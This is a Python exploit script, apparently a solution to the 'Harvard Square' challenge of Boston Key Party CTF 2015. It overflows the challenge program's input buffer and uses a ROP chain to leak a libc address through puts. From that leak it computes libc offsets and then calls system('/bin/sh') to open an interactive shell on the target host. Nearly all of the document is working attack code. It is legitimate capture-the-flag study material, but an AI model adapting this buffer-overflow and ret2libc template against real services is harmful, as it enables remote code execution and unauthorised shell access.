#!/usr/bin/env python
import struct,socket,telnetlib

# Boston Key Party CTF 2015
# libc md5 adf3305fcd0345f706019cf94687d50b
# pwning : Harvard Square

def shell():
	t = telnetlib.Telnet()
	t.sock = s
	t.interact()

def p(addr):
	return struct.pack("<Q",addr)

def read_until(token):
	data = ""
	while not data.endswith(token):
		data += f.read(1)
	return data
s = socket.create_connection(("127.0.0.1",8888))
#s = socket.create_connection(("52.1.91.215",2114))
f = s.makefile('rw',bufsize=0)

cheat = "hacktheplanet".ljust(24,"A")
egg = 0x4017df # input name

libc_main_got = 0x605080
puts_plt = 0x400cd0

payload = cheat+p(egg) 
print len(payload)
f.write(payload + "\n")

f.write("1\n") # buy
f.write("1\n") # buy vlc
f.write("1\n") # buy 1
f.write("5\n") # sleep


pop_rdi = 0x402fc3

payload2 = "A" * 0x118 + p(pop_rdi) + p(libc_main_got) + p(puts_plt) + p(egg) + "\n"

print read_until("name?")

# input score 
f.write(payload2)

print read_until("Job")
print read_until("\n")

leak_addr = read_until("\n").replace("\n","").ljust(8,"\x00")
leak_addr = struct.unpack("<Q",leak_addr)[0]

print "get libc_main address\n" + hex(leak_addr)

main_offset = 0x21dd0
system_offset = 0x46640
binsh_offset = 0x17d87b
libc_base = leak_addr - main_offset
libc_system = libc_base + system_offset
binsh = libc_base + binsh_offset
print "we get system addr " + hex(libc_system)
print "/bin/sh is at " + hex(binsh)
payload3 = "A" * 0x118 + p(pop_rdi) + p(binsh) + p(libc_system) * 10 + "\n"
f.write(payload3)

shell()


